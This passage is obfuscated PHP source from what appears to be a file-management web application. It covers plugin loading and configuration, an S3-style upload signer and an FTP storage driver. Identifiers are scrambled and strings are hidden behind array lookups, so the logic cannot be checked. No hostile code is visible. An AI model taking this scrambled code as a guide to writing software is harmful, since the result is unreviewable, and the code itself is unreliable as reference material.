$ˆ¬–ÓË = Model($¡­‡Îìµ[1425])->listSource($ûóıûÅ); if (!$ˆ¬–ÓË || count($ŞŸÓâ’”) == $ˆ¬–ÓË[$¡­‡Îìµ[442]][$¡­‡Îìµ[443]]) { return $ˆ¬–ÓË; } $³ô‚ŞŒÍ = array(); $½ÌŠı›½ = array_to_keyvalue($ˆ¬–ÓË[$¡­‡Îìµ[85]], $¡­‡Îìµ[12], $¡­‡Îìµ[193]); $ŸÄâ™ñ = array_to_keyvalue($ˆ¬–ÓË[$¡­‡Îìµ[86]], $¡­‡Îìµ[12], $¡­‡Îìµ[193]); $ÂŸæËÂä = array_merge($ŸÄâ™ñ, $½ÌŠı›½); foreach ($ŞŸÓâ’” as $èÜ–Œó) { if (!in_array($èÜ–Œó, $ÂŸæËÂä)) { $³ô‚ŞŒÍ[] = $èÜ–Œó; } } if ($³ô‚ŞŒÍ) { $this->removeBySource($¡ˆÆ›‰ˆ, $³ô‚ŞŒÍ); } return $ˆ¬–ÓË; } protected function listData($×‚¾±èÉ) { $ø´§ëŠØ =& $_SERVER[¿ğÚ‰±–]; $“”»ÚÜ = array($ø´§ëŠØ[1768] => 0, $ø´§ëŠØ[557] => array($ø´§ëŠØ[2095], 0), $ø´§ëŠØ[496] => $ø´§ëŠØ[2096] . $×‚¾±èÉ); $£Õ¢¡‚ = $ø´§ëŠØ[2097]; $À¯î‹İ = $this->field($£Õ¢¡‚)->where($“”»ÚÜ)->order($ø´§ëŠØ[2098])->select(); return $À¯î‹İ ? $À¯î‹İ : array(); } protected function addToTag($™øßÁâ, $àÁÍêá†, $¥ÇŞ›‘Ò) { $à“Åô¹ª =& $_SERVER[¿ğÚ‰±–]; if (!$this->getByTagID($™øßÁâ, $¥ÇŞ›‘Ò) || !$àÁÍêá†) { return !1; } if (!Model($à“Åô¹ª[902])->pathInfo($àÁÍêá†)) { return !1; } $Ğ‰Æá¦Ê = array($à“Åô¹ª[1768] => 0, $à“Åô¹ª[557] => $¥ÇŞ›‘Ò, $à“Åô¹ª[495] => $àÁÍêá†, $à“Åô¹ª[496] => $à“Åô¹ª[2099] . $™øßÁâ, $à“Åô¹ª[494] => $à“Åô¹ª[12], $à“Åô¹ª[1980] => 0); if ($this->where($Ğ‰Æá¦Ê)->find()) { return !1; } return $this->add($Ğ‰Æá¦Ê); } protected function removeFromTag($›ñÆ²Á, $™ˆùûÄ³, $Ø“Î¶²Î) { $ÂšøÈô§ =& $_SERVER[¿ğÚ‰±–]; if (!$this->getByTagID($›ñÆ²Á, $Ø“Î¶²Î) || !$™ˆùûÄ³) { return !1; } if (is_array($™ˆùûÄ³)) { $™ˆùûÄ³ = array($ÂšøÈô§[7], $™ˆùûÄ³); } $»Á«îÀ— = array($ÂšøÈô§[1768] => 0, $ÂšøÈô§[557] => $Ø“Î¶²Î, $ÂšøÈô§[496] => $ÂšøÈô§[2099] . $›ñÆ²Á, $ÂšøÈô§[495] => $™ˆùûÄ³); return $this->where($»Á«îÀ—)->delete(); } protected function removeByTag($¢İŞü¾­, $¶ôÎàƒ) { $Äò™¯Ç— =& $_SERVER[¿ğÚ‰±–]; if (!$this->getByTagID($¢İŞü¾­, $¶ôÎàƒ)) { return !1; } $ò­ùïøÛ = array($Äò™¯Ç—[1768] => 0, $Äò™¯Ç—[557] => $¶ôÎàƒ, $Äò™¯Ç—[496] => $Äò™¯Ç—[2099] . $¢İŞü¾­); return $this->where($ò­ùïøÛ)->delete(); } protected function removeBySource($çà”²ó, $Õ„Ë²œ) { $”…°ÇÇ‡ =& $_SERVER[¿ğÚ‰±–]; if (!$çà”²ó || !$Õ„Ë²œ) { return !1; } if (is_array($Õ„Ë²œ)) { $Õ„Ë²œ = array($”…°ÇÇ‡[7], $Õ„Ë²œ); } $—™„¸Ø = array($”…°ÇÇ‡[1768] => 0, $”…°ÇÇ‡[495] => $Õ„Ë²œ, $”…°ÇÇ‡[557] => array($”…°ÇÇ‡[1099], 0), $”…°ÇÇ‡[496] => $”…°ÇÇ‡[2099] . $çà”²ó); return $this->where($—™„¸Ø)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\x2e\x70\x6c\165\147\x69\x6e\x4c\151\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\163\x74\141\164\165\163", "\x72\145\147\x69\x65\163\x74", "\143\157\x6e\146\x69\x67"); public function loadList($€‘ÉÛ = false) { $î°Åã±µ = array_to_keyvalue($this->listData(), $_SERVER[¿ğÚ‰±–][32]); if ($€‘ÉÛ) { return $î°Åã±µ[$€‘ÉÛ]; } return $î°Åã±µ; } public function init() { $ÃãÃîÕÑ =& $_SERVER[¿ğÚ‰±–]; Hook::trigger($ÃãÃîÕÑ[2100]); $¶–Â…« = $this->loadPluginList(); foreach ($¶–Â…« as $ÍÆÔ„¹± => $×øÉß¡¬) { $ŒòĞíÌº = $this->appAllow($ÍÆÔ„¹±, $×øÉß¡¬); if (!$ŒòĞíÌº) { continue; } foreach ($×øÉß¡¬[$ÃãÃîÕÑ[2101]] as $»‘ƒŸ¤í => $˜¬µÁ™) { Hook::bind($»‘ƒŸ¤í, $˜¬µÁ™); } } Hook::trigger($ÃãÃîÕÑ[2102]); Hook::trigger(ACTION); } public function appAllow($ù¿ºÙıÍ, $´¦…ü±Õ, $åéÑ…òƒ = true) { $­ÁèÊá =& $_SERVER[¿ğÚ‰±–]; $ˆØ‚®’÷ = PLUGIN_DIR . $ù¿ºÙıÍ . $­ÁèÊá[2103]; if (!is_array($´¦…ü±Õ) || !is_array($´¦…ü±Õ[$­ÁèÊá[2101]]) || $´¦…ü±Õ[$­ÁèÊá[828]] != 1 || !is_file($ˆØ‚®’÷)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$­ÁèÊá[6]][$­ÁèÊá[2104]] || !$GLOBALS[$­ÁèÊá[6]][$­ÁèÊá[2105]]) { return !0; } $™Ÿ½×‚Ÿ = explode($­ÁèÊá[50], strtolower($GLOBALS[$­ÁèÊá[6]][$­ÁèÊá[2105]])); return in_array(strtolower($ù¿ºÙıÍ), $™Ÿ½×‚Ÿ) ? !1 : !0; } if ($åéÑ…òƒ && !Action($­ÁèÊá[2106])->checkAuth($ù¿ºÙıÍ)) { return !1; } return !0; } public function unInstall($Ñš–í¸õ) { $å©Úª˜¤ =& $_SERVER[¿ğÚ‰±–]; $¦àß¤óû = $this->loadList($Ñš–í¸õ); if (file_exists(PLUGIN_DIR . $Ñš–í¸õ)) { Hook::apply($Ñš–í¸õ . $å©Úª˜¤[2107]); } $this->remove($¦àß¤óû[$å©Úª˜¤[475]]); } public function changeStatus($›Àú’Ô, $»¾ˆ¿Ë½) { $ÄÀÌïû =& $_SERVER[¿ğÚ‰±–]; $˜Õ†ÒÙ° = $this->loadList($›Àú’Ô); if ($»¾ˆ¿Ë½) { Hook::apply($›Àú’Ô . $ÄÀÌïû[2108]); } $this->update($˜Õ†ÒÙ°[$ÄÀÌïû[475]], array($ÄÀÌïû[2109] => $»¾ˆ¿Ë½)); } public function appRegist($ş ûÓÒ§, $ÄŸ§£Ç) { $æÇã“ï¿ =& $_SERVER[¿ğÚ‰±–]; $–ªäæÃ¤ = $this->loadList($ş ûÓÒ§); if ($–ªäæÃ¤) { $this->update($–ªäæÃ¤[$æÇã“ï¿[475]], array($æÇã“ï¿[2101] => $ÄŸ§£Ç)); } else { $ì´´êÒ¨ = array($æÇã“ï¿[32] => $ş ûÓÒ§, $æÇã“ï¿[2101] => $ÄŸ§£Ç, $æÇã“ï¿[828] => 0, $æÇã“ï¿[6] => $this->getConfigDefault($ş ûÓÒ§)); $this->insert($ì´´êÒ¨); } } public function getConfigDefault($åƒ Ò»í) { $¹ùã’Ù =& $_SERVER[¿ğÚ‰±–]; $œÜ‚±† = array(); $‹ÈÀœ¥ = $this->getPackageJson($åƒ Ò»í); if (!$‹ÈÀœ¥ && is_array($‹ÈÀœ¥[$¹ùã’Ù[2110]])) { return $œÜ‚±†; } foreach ($‹ÈÀœ¥[$¹ùã’Ù[2110]] as $İ‡—áİ¨ => $•«Ğğë‚) { if (!isset($•«Ğğë‚[$¹ùã’Ù[450]]) || isset($œÜ‚±†[$İ‡—áİ¨])) { continue; } $œÜ‚±†[$İ‡—áİ¨] = $•«Ğğë‚[$¹ùã’Ù[450]]; } return $œÜ‚±†; } public function getPackageJson($å¨Ğ§÷) { return Hook::apply($å¨Ğ§÷ . $_SERVER[¿ğÚ‰±–][2111]); } public function getConfig($¢¾ˆÖôˆ, $¨ÃÁ×÷Ò = false) { $½¦Š÷È =& $_SERVER[¿ğÚ‰±–]; $¨Òšıè = array(); $¿­Å¬Ô› = $this->loadList($¢¾ˆÖôˆ); if ($¿­Å¬Ô› && is_array($¿­Å¬Ô›[$½¦Š÷È[6]])) { $¨Òšıè = $¿­Å¬Ô›[$½¦Š÷È[6]]; } if (!$¨Òšıè || $¨ÃÁ×÷Ò) { $¨Òšıè = $this->getConfigDefault($¢¾ˆÖôˆ); } return $¨Òšıè; } public function setConfig($¶•îŠ‡Š, $Ú›¬é¯€ = false) { $Ò×ÉÉ²Ö =& $_SERVER[¿ğÚ‰±–]; $á¼³´ = $this->loadList($¶•îŠ‡Š); if (!$á¼³´) { return !1; } $ä…‰º¿ = $á¼³´[$Ò×ÉÉ²Ö[6]]; if ($Ú›¬é¯€ == !1) { $ä…‰º¿ = array(); $Ú›¬é¯€ = $this->getConfigDefault($¶•îŠ‡Š); } foreach ($Ú›¬é¯€ as $ù§•‚¾÷ => $¨©…£şÉ) { $ä…‰º¿[$ù§•‚¾÷] = is_string($¨©…£şÉ) ? trim($¨©…£şÉ) : $¨©…£şÉ; } $this->update($á¼³´[$Ò×ÉÉ²Ö[475]], array($Ò×ÉÉ²Ö[6] => $ä…‰º¿)); } public function viewList() { $Üİ½¿Ä˜ =& $_SERVER[¿ğÚ‰±–]; $ı¾ÌŠ“‘ = $this->loadList(); $this->pluginScan($ı¾ÌŠ“‘); $ı¾ÌŠ“‘ = $this->loadPluginList(); $øæ¿²Øª = array(); foreach ($ı¾ÌŠ“‘ as $ÕÍÎŠè³ => $éÓûÓó) { $À³ÏÉç = $éÓûÓó; unset($éÓûÓó[$Üİ½¿Ä˜[2101]], $éÓûÓó[$Üİ½¿Ä˜[6]]); $ÚÒÉ€å¥ = PLUGIN_DIR . $éÓûÓó[$Üİ½¿Ä˜[32]] . $Üİ½¿Ä˜[2103]; if (!is_file($ÚÒÉ€å¥)) { continue; } $€Û§æ®ß = Hook::apply($éÓûÓó[$Üİ½¿Ä˜[32]] . $Üİ½¿Ä˜[2111]); if (!is_array($€Û§æ®ß)) { continue; } $øæ¿²Øª[$ÕÍÎŠè³] = array_merge($éÓûÓó, $€Û§æ®ß); if ($À³ÏÉç[$Üİ½¿Ä˜[6]][$Üİ½¿Ä˜[1691]] != $€Û§æ®ß[$Üİ½¿Ä˜[1665]]) { Hook::apply($éÓûÓó[$Üİ½¿Ä˜[32]] . $Üİ½¿Ä˜[2108]); $À³ÏÉç[$Üİ½¿Ä˜[6]][$Üİ½¿Ä˜[1691]] = $€Û§æ®ß[$Üİ½¿Ä˜[1665]]; $this->update($éÓûÓó[$Üİ½¿Ä˜[475]], array($Üİ½¿Ä˜[6] => $À³ÏÉç[$Üİ½¿Ä˜[6]])); } } return $øæ¿²Øª; } private function loadPluginList() { $±Ş–÷ÚÂ =& $_SERVER[¿ğÚ‰±–]; $•úˆ²ğ = $this->loadList(); if (strtolower(MOD) == $±Ş–÷ÚÂ[2112]) { return $•úˆ²ğ; } $¡Î·÷ù = Hook::trigger($±Ş–÷ÚÂ[2113], $•úˆ²ğ); if ($•úˆ²ğ && !$¡Î·÷ù) { die; } return $¡Î·÷ù ? $¡Î·÷ù : $•úˆ²ğ; } private function pluginScan($’´‡à‹Ä) { $ˆ«õš‰¤ =& $_SERVER[¿ğÚ‰±–]; recursion_dir(PLUGIN_DIR, $ÏÀª•ğ, $®¿Óµõ, 0); foreach ($ÏÀª•ğ as $ÃÔµÌ¢ê) { $Àšëâˆô = get_path_this($ÃÔµÌ¢ê); if (isset($’´‡à‹Ä[$Àšëâˆô]) || !file_exists($ÃÔµÌ¢ê . $ˆ«õš‰¤[2114]) || !file_exists($ÃÔµÌ¢ê . $ˆ«õš‰¤[2103])) { continue; } Hook::apply($Àšëâˆô . $ˆ«õš‰¤[2108]); } } } goto b„‘äÚÃÉá; dÁ«÷¼ï±¦: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($²™­œ·ù) { parent::__construct($²™­œ·ù); $this->setSignVersion($_SERVER[¿ğÚ‰±–][247]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($£ëÌ³ô¬) { parent::__construct($£ëÌ³ô¬); $this->setSignVersion($_SERVER[¿ğÚ‰±–][247]); } public function uploadFormData($Á¤Úèöñ, $†Üİ‰’ = 3600) { $şÛ´«ùÁ =& $_SERVER[¿ğÚ‰±–]; $¾‰“ü±¸ = $şÛ´«ùÁ[229]; $ûš½²Ç§ = $şÛ´«ùÁ[270]; $Éİ´ƒ¬¨ = $şÛ´«ùÁ[62]; $Ò¥çöã¢ = gmdate($şÛ´«ùÁ[271]); $–ë¾ó¦¶ = gmdate($şÛ´«ùÁ[272]); $¨øšû•× = $şÛ´«ùÁ[273]; $ê¹±½¯‡ = $†Üİ‰’ . $şÛ´«ùÁ[12]; $ŒÒ®ºŒ  = $şÛ´«ùÁ[274]; $ÍÉ÷Ã© = array($this->accessKey, $–ë¾ó¦¶, $this->region, $Éİ´ƒ¬¨, $¨øšû•×); $ÍİÇÒô = implode($şÛ´«ùÁ[8], $ÍÉ÷Ã©); $˜Ÿ‹÷µ© = array($şÛ´«ùÁ[275] => gmdate($şÛ´«ùÁ[299], strtotime($şÛ´«ùÁ[277])), $şÛ´«ùÁ[278] => array(array($şÛ´«ùÁ[279] => $this->bucket), array($şÛ´«ùÁ[280] => $¾‰“ü±¸), array($şÛ´«ùÁ[281], $şÛ´«ùÁ[282], $şÛ´«ùÁ[12]), array($şÛ´«ùÁ[281], $şÛ´«ùÁ[283], $şÛ´«ùÁ[12]), array($şÛ´«ùÁ[281], $şÛ´«ùÁ[284], $şÛ´«ùÁ[12]), array($şÛ´«ùÁ[285] => $ŒÒ®ºŒ ), array($şÛ´«ùÁ[286] => $ÍİÇÒô), array($şÛ´«ùÁ[287] => $ûš½²Ç§), array($şÛ´«ùÁ[288] => $Ò¥çöã¢), array($şÛ´«ùÁ[289] => $ê¹±½¯‡))); $ó¤Ş¹åï = base64_encode(json_encode($˜Ÿ‹÷µ©)); $‹Ãùªû© = hash_hmac($şÛ´«ùÁ[290], $–ë¾ó¦¶, $şÛ´«ùÁ[291] . $this->secret, !0); $æêŸéå» = hash_hmac($şÛ´«ùÁ[290], $this->region, $‹Ãùªû©, !0); $”¤Ò¨¹œ = hash_hmac($şÛ´«ùÁ[290], $Éİ´ƒ¬¨, $æêŸéå», !0); $í¯ÜúÌ  = hash_hmac($şÛ´«ùÁ[290], $¨øšû•×, $”¤Ò¨¹œ, !0); $ü‹„ÇÌÄ = hash_hmac($şÛ´«ùÁ[290], $ó¤Ş¹åï, $í¯ÜúÌ ); $‰–ø»´¥ = array($şÛ´«ùÁ[246] => $şÛ´«ùÁ[12], $şÛ´«ùÁ[292] => $şÛ´«ùÁ[12], $şÛ´«ùÁ[280] => $¾‰“ü±¸, $şÛ´«ùÁ[285] => $ŒÒ®ºŒ , $şÛ´«ùÁ[293] => $ó¤Ş¹åï, $şÛ´«ùÁ[294] => $ÍİÇÒô, $şÛ´«ùÁ[295] => $ûš½²Ç§, $şÛ´«ùÁ[296] => $Ò¥çöã¢, $şÛ´«ùÁ[297] => $ê¹±½¯‡, $şÛ´«ùÁ[298] => $ü‹„ÇÌÄ, $şÛ´«ùÁ[208] => $this->getHost()); return $‰–ø»´¥; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($¹µ¹Í”›) { parent::__construct(); if (count($¹µ¹Í”›) > 0) { $this->_init($¹µ¹Í”›); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($À™öÄ´) { $üÎ»Ü»õ =& $_SERVER[¿ğÚ‰±–]; global $config; $this->appCharset = $config[$üÎ»Ü»õ[1443]]; $this->systemCharset = $config[$üÎ»Ü»õ[1444]]; if (isset($À™öÄ´[$üÎ»Ü»õ[1445]]) && $À™öÄ´[$üÎ»Ü»õ[1445]]) { $this->systemCharset = $À™öÄ´[$üÎ»Ü»õ[1445]]; } } public function iconvApp($¦÷İªûÑ) { return $this->iconvTo($¦÷İªûÑ, $this->systemCharset, $this->appCharset); } public function iconvSystem($Ö¬¸Ôº±) { return $this->iconvTo($Ö¬¸Ôº±, $this->appCharset, $this->systemCharset); } public function getPathOuter($Ô†ˆÀ‘) { $ğ¹‡à±ˆ =& $_SERVER[¿ğÚ‰±–]; $Ä™Ü‚ğö = $this->iconvApp($this->pathBase); $Ô†ˆÀ‘ = $this->iconvApp($Ô†ˆÀ‘); if (substr($Ä™Ü‚ğö, 0, 2) == $ğ¹‡à±ˆ[1417]) { $Ä™Ü‚ğö = BASIC_PATH . substr($Ä™Ü‚ğö, 2); } if (substr($Ô†ˆÀ‘, 0, 2) == $ğ¹‡à±ˆ[1417]) { $Ô†ˆÀ‘ = BASIC_PATH . substr($Ô†ˆÀ‘, 2); } $Ä™Ü‚ğö = KodIO::clear($Ä™Ü‚ğö); $Ô†ˆÀ‘ = KodIO::clear($Ô†ˆÀ‘); $Ô†ˆÀ‘ = substr($Ô†ˆÀ‘, strlen($Ä™Ü‚ğö)); if (empty($this->pathDriver)) { return $Ô†ˆÀ‘; } return $this->pathDriver . $ğ¹‡à±ˆ[8] . ltrim($Ô†ˆÀ‘, $ğ¹‡à±ˆ[8]); } private function _init($¹¾ÚŞ§š = array()) { $­¦¹¾§å =& $_SERVER[¿ğÚ‰±–]; if (!function_exists($­¦¹¾§å[1446])) { throw new Exception(LNG($­¦¹¾§å[1447])); } $this->config = $¹¾ÚŞ§š; $this->charsetReset($¹¾ÚŞ§š); foreach ($¹¾ÚŞ§š as $œªƒ–¾‚ => $İ»™Á®) { if (isset($this->{$œªƒ–¾‚})) { $this->{$œªƒ–¾‚} = $İ»™Á®; } } return $this->_login($¹¾ÚŞ§š); } private function _login($—ÄêåÄ) { $Í™Œ´õ =& $_SERVER[¿ğÚ‰±–]; static $á„ÀÛï = array(); $”·Â¯”Ê = md5(json_encode($—ÄêåÄ)); if (isset($á„ÀÛï[$”·Â¯”Ê])) { foreach ($á„ÀÛï[$”·Â¯”Ê] as $ü‚êšŞš => $Ëï¸Â­›) { $this->{$ü‚êšŞš} = $Ëï¸Â­›; } return !0; } $Äîö¤·¥ = parse_url(trim($this->server, $Í™Œ´õ[8])); $this->host = $Äîö¤·¥[$Í™Œ´õ[208]]; $‰î·üÁÀ = isset($Äîö¤·¥[$Í™Œ´õ[207]]) && $Äîö¤·¥[$Í™Œ´õ[207]] == $Í™Œ´õ[1448] ? !0 : !1; $this->scheme = $‰î·üÁÀ ? $Í™Œ´õ[1449] : $Í™Œ´õ[1450]; $this->port = isset($Äîö¤·¥[$Í™Œ´õ[209]]) ? $Äîö¤·¥[$Í™Œ´õ[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($Í™Œ´õ[1451]) . $this->host . $Í™Œ´õ[4] . $this->port, !0); return !1; } $œ†™”®ğ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$œ†™”®ğ) { $this->writeLog(LNG($Í™Œ´õ[1452]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $×œ­ï€î = $this->pasv == $Í™Œ´õ[91] ? !0 : !1; @ftp_pasv($this->connect, $×œ­ï€î); $á„ÀÛï[$”·Â¯”Ê] = array($Í™Œ´õ[1453] => $this->connect, $Í™Œ´õ[208] => $this->host, $Í™Œ´õ[207] => $this->scheme, $Í™Œ´õ[209] => $this->port); return $œ†™”®ğ; } private function _isconn($İ„È–Íá = true) { if (is_resource($this->connect)) { return !0; } if (!$İ„È–Íá) { return !1; } return $this->_login($this->config); } public function mkfile($ÒÀÚ©¾÷, $÷êò•¸Ş = '', $ÇîËãâñ = REPEAT_RENAME) { if ($this->setContent($ÒÀÚ©¾÷, $÷êò•¸Ş)) { return $this->getPathOuter($ÒÀÚ©¾÷); } $this->writeLog(LNG($_SERVER[¿ğÚ‰±–][1454]), !0); return !1; } public function mkdir($¾Ïû‰, $Œëşöœù = REPEAT_SKIP) { $æ¤ÜÔ¥Î =& $_SERVER[¿ğÚ‰±–]; if (!$¾Ïû‰ || $¾Ïû‰ == $æ¤ÜÔ¥Î[8]) { return !0; } if (!$this->_isconn()) { return !1; } $¾Ïû‰ = $this->iconvSystem($¾Ïû‰); if ($this->_isFolder($¾Ïû‰) || @ftp_mkdir($this->connect, $¾Ïû‰)) { return $this->getPathOuter($¾Ïû‰); } if (!$this->mkdir($this->pathFather($¾Ïû‰))) { return !1; } if ($¾Ïû‰ = @ftp_mkdir($this->connect, $¾Ïû‰)) { return $this->getPathOuter($¾Ïû‰); } $this->writeLog(__FUNCTION__ . $æ¤ÜÔ¥Î[1455], !0); return !1; } public function copyFile($Úß¨Ç, $œÊéíì†) { if (!$this->_isconn()) { return !1; } $ƒ´Ğ¾Ãº = $this->pathThis($this->iconvSystem($Úß¨Ç)); $ŠÅØœ±À = $this->tempFile($ƒ´Ğ¾Ãº); $Õû·ƒç = $this->iconvApp($ŠÅØœ±À); $this->download($Úß¨Ç, $Õû·ƒç); $ÆÛºêÛ = $this->upload($œÊéíì†, $Õû·ƒç); $this->tempFileRemve($ŠÅØœ±À); return $ÆÛºêÛ; } public function moveFile($¬Úö”ùò, $ÀîÑ¯¤É) { if (!$this->_isconn()) { return !1; } $¬Úö”ùò = $this->iconvSystem($¬Úö”ùò); $ÀîÑ¯¤É = $this->iconvSystem($ÀîÑ¯¤É); $Ğ ûØ¥ = @ftp_rename($this->connect, $¬Úö”ùò, $ÀîÑ¯¤É); if (!$Ğ ûØ¥) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ğÚ‰±–][1455], !0); return !1; } return $this->getPathOuter($ÀîÑ¯¤É); } public function delFile($¢±æò‚¯) { if (!$this->_isconn()) { return !1; } $¢±æò‚¯ = $this->iconvSystem($¢±æò‚¯); $©¹À«ì™ = @ftp_delete($this->connect, $¢±æò‚¯); if (!$©¹À«ì™) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ğÚ‰±–][1455], !0); } return $©¹À«ì™; } public function delFolder($–™õ£üå) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $–íÊˆ–İ = $ºª•ˆÕ = array(); $this->fileList($–™õ£üå, $–íÊˆ–İ, $ºª•ˆÕ, !0); $this->listItemCache = !0; foreach ($ºª•ˆÕ as $«äåù¤¸) { $ßòµ¶Ü = $this->iconvSystem($«äåù¤¸[$_SERVER[¿ğÚ‰±–][32]]); $®Ûò©ñ½ = @ftp_delete($this->connect, $ßòµ¶Ü); if (!$®Ûò©ñ½) { return !1; } } foreach ($–íÊˆ–İ as $ßòµ¶Ü) { $ßòµ¶Ü = $this->iconvSystem($ßòµ¶Ü); $®Ûò©ñ½ = @ftp_rmdir($this->connect, $ßòµ¶Ü); if (!$®Ûò©ñ½) { return !1; } } $–™õ£üå = $this->iconvSystem($–™õ£üå); return @ftp_rmdir($this->connect, $–™õ£üå); } public function rename($‰äÍí»˜, $’ıóÎí‡) { $ùÜï—™ =& $_SERVER[¿ğÚ‰±–]; if (!$this->_isconn()) { return !1; } $”³¨í§ñ = $this->fileNameAuto($this->pathFather($‰äÍí»˜), $’ıóÎí‡); $”³¨í§ñ = $this->iconvSystem($”³¨í§ñ); $‰äÍí»˜ = $this->iconvSystem($‰äÍí»˜); $ëæŞ¥ÊÜ = $this->pathFather($‰äÍí»˜); $õÑğÁ– = rtrim($ëæŞ¥ÊÜ, $ùÜï—™[8]) . $ùÜï—™[8] . $”³¨í§ñ; $÷öãäŠš = @ftp_rename($this->connect, $‰äÍí»˜, $õÑğÁ–); if (!$÷öãäŠš) { $this->writeLog(__FUNCTION__ . $ùÜï—™[1455], !0); return !1; } $õÑğÁ– = $this->iconvApp($õÑğÁ–); return $this->getPathOuter($õÑğÁ–); } private function folderInfo($ëú‹Ñî›, $—›Èİ¸¶ = false) { $©íùş¿µ =& $_SERVER[¿ğÚ‰±–]; $¶ÚáÆ×İ = array($©íùş¿µ[32] => $this->pathThis($ëú‹Ñî›), $©íùş¿µ[87] => $this->getPathOuter($©íùş¿µ[8] . $ëú‹Ñî›), $©íùş¿µ[33] => $©íùş¿µ[78]); if ($—›Èİ¸¶) { return $¶ÚáÆ×İ; } $¶ÚáÆ×İ[$©íùş¿µ[231]] = $¶ÚáÆ×İ[$©íùş¿µ[88]] = 0; $¶ÚáÆ×İ[$©íùş¿µ[232]] = $¶ÚáÆ×İ[$©íùş¿µ[233]] = !0; return $¶ÚáÆ×İ; } private function fileInfo($“ô¤Íì, $É¦ûºº = false, $ä”›Ë‘İ = array()) { $Ø°Ï§¹£ =& $_SERVER[¿ğÚ‰±–]; $·á…·Ã = array($Ø°Ï§¹£[32] => $this->pathThis($“ô¤Íì), $Ø°Ï§¹£[87] => $this->getPathOuter($Ø°Ï§¹£[8] . $“ô¤Íì), $Ø°Ï§¹£[33] => $Ø°Ï§¹£[230], $Ø°Ï§¹£[79] => isset($ä”›Ë‘İ[$Ø°Ï§¹£[79]]) ? $ä”›Ë‘İ[$Ø°Ï§¹£[79]] : 0, $Ø°Ï§¹£[169] => $this->ext($“ô¤Íì)); if ($É¦ûºº) { return $·á…·Ã; } $·á…·Ã[$Ø°Ï§¹£[231]] = $·á…·Ã[$Ø°Ï§¹£[88]] = 0; $·á…·Ã[$Ø°Ï§¹£[232]] = $·á…·Ã[$Ø°Ï§¹£[233]] = !0; $‡ó—¾·‘ = $this->iconvSystem($“ô¤Íì); $·á…·Ã[$Ø°Ï§¹£[88]] = @ftp_mdtm($this->connect, $‡ó—¾·‘); if (empty($ä”›Ë‘İ)) { $ä”›Ë‘İ = $this->objectMeta($“ô¤Íì); if (!$ä”›Ë‘İ) { return $·á…·Ã; } } $·á…·Ã[$Ø°Ï§¹£[79]] = $ä”›Ë‘İ[$Ø°Ï§¹£[79]]; return $·á…·Ã; } public function size($àë³¬Ûá) { $·Œ’ş = $this->objectMeta($àë³¬Ûá); return $·Œ’ş ? $·Œ’ş[$_SERVER[¿ğÚ‰±–][79]] : 0; } public function info($ùÍ¼¯‹Û) { if ($this->isFile($ùÍ¼¯‹Û)) { return $this->fileInfo($ùÍ¼¯‹Û, 0); } else { if ($this->isFolder($ùÍ¼¯‹Û)) { return $this->folderInfo($ùÍ¼¯‹Û); } } return !1; } private function fileList($¢™ï‹‡á, &$ØâÂç†Û, &$Àš¶…§, $Œ—Ìí— = false) { $«ÙÑâÒµ =& $_SERVER[¿ğÚ‰±–]; $¢™ï‹‡á = $this->iconvSystem($¢™ï‹‡á); if (!$this->isFolder($¢™ï‹‡á)) { return !1; } @ftp_chdir($this->connect, $«ÙÑâÒµ[8]); $¢™ï‹‡á = rtrim($¢™ï‹‡á, $«ÙÑâÒµ[8]) . $«ÙÑâÒµ[8]; check_abort(); $‹·şÄõ” = @ftp_rawlist($this->connect, $¢™ï‹‡á); if (!$‹·şÄõ”) { $‹·şÄõ” = array(); } $‚í¹¼­ = array($«ÙÑâÒµ[10] => 1, $«ÙÑâÒµ[1370] => 1); foreach ($‹·şÄõ” as $ËØÊìî£) { $™¸şàÌÆ = $this->_listItem($ËØÊìî£); if ($™¸şàÌÆ[0] == $«ÙÑâÒµ[836]) { continue; } $‚ÖÁù—Ì = $™¸şàÌÆ[8]; if (empty($‚ÖÁù—Ì) && $‚ÖÁù—Ì !== $«ÙÑâÒµ[228] || isset($‚í¹¼­[$‚ÖÁù—Ì])) { continue; } $‚ÖÁù—Ì = $this->iconvApp($¢™ï‹‡á . ltrim($‚ÖÁù—Ì, $«ÙÑâÒµ[8])); $›Ñı• = array($«ÙÑâÒµ[32] => $‚ÖÁù—Ì, $«ÙÑâÒµ[33] => $«ÙÑâÒµ[230], $«ÙÑâÒµ[79] => $™¸şàÌÆ[4]); if (substr($ËØÊìî£, 0, 1) == $«ÙÑâÒµ[1456]) { $›Ñı•[$«ÙÑâÒµ[33]] = $«ÙÑâÒµ[78]; $›Ñı•[$«ÙÑâÒµ[79]] = 0; } $—•µŠŠ = $›Ñı•[$«ÙÑâÒµ[33]] == $«ÙÑâÒµ[78] ? !0 : !1; $this->cacheMethodInfoSet($‚ÖÁù—Ì, $—•µŠŠ, $›Ñı•); if ($—•µŠŠ) { $ØâÂç†Û[] = $‚ÖÁù—Ì; if ($Œ—Ìí—) { $this->fileList($‚ÖÁù—Ì, $ØâÂç†Û, $Àš¶…§, $Œ—Ìí—); } continue; } $Àš¶…§[] = $›Ñı•; } $this->cacheMethodInfoSet($¢™ï‹‡á, !0); } private function _listItem($Şáú²•ı) { if (empty($Şáú²•ı)) { return array(); } $ğòÍÅ…– = preg_split($_SERVER[¿ğÚ‰±–][1457], $Şáú²•ı); if (count($ğòÍÅ…–) <= 9) { return $ğòÍÅ…–; } $ğòÍÅ…–[8] = trim(substr($Şáú²•ı, strpos($Şáú²•ı, $ğòÍÅ…–[7]) + strlen($ğòÍÅ…–[7]))); return array_splice($ğòÍÅ…–, 0, 9); } public function listPath($ƒçÙíÙÈ, $ËŸ‹¾•‚ = false) { $²ÛÓº–Û =& 